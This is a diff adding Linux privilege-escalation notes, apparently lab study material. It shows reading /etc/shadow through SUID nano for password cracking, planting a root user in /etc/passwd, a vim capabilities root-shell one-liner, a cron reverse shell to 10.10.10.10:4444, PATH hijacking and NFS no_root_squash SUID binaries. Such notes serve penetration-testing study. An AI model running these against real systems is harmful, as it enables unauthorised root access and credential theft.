@@ -218,26 +218,118 @@ curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/d
 2.  Sources such as [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can also be useful.
 3.  Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
 
+## Unshadow
 
+The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.  
 
+Below are simple steps using both vectors.  
+  
+reading the `/etc/shadow` file  
+  
+We see that the nano text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.  
+  
+`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.
 
+### Add Hash
 
+The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:
 
+We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.
 
+![](https://i.imgur.com/bkOGaHY.png)  
 
+We will then add this password with a username to the `/etc/passwd` file. 
 
+![](https://i.imgur.com/huGoEtj.png)
 
+Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.
 
+![](https://i.imgur.com/HZcWGhi.png)
 
+### Capabilities
 
+```shell
+getcap -r / 2>/dev/null
+```
 
+https://gtfobins.github.io/gtfobins/vim/#capabilities
 
+```shell
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
 
+### Cron jobs
 
+`/etc/crontab`
 
+```bash
+#!/bin/bash
 
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+```
 
+remember to chmod +x
 
+### PATH
 
+PATH
+```shell
+echo $PATH
+```
+
+Find writeable
+```shell
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+```
+
+```shell
+find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
+```
+
+```shell
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+
+Add /tmp to PATH
+```shell
+export PATH=/tmp:$PATH
+```
+
+Bash
+```bash
+#include<unistd.h>
+void main ()
+{ setuid(0);
+  setgid(0);
+  system("thm");
+}
+```
+
+### NFS
+
+NFS config file
+```shell
+cat /etc/exports
+```
+
+mount to no_root_squash
+```shell
+sudo mount -o rw 10.10.10.10:/home/backup /tmp/backupattacker
+```
+
+SUID bits
+```bash
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+```
+
+fix ./code: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34 not found (required by ./code)
+```shell
+sudo gcc -static code.c -o code -w
+```
 
 
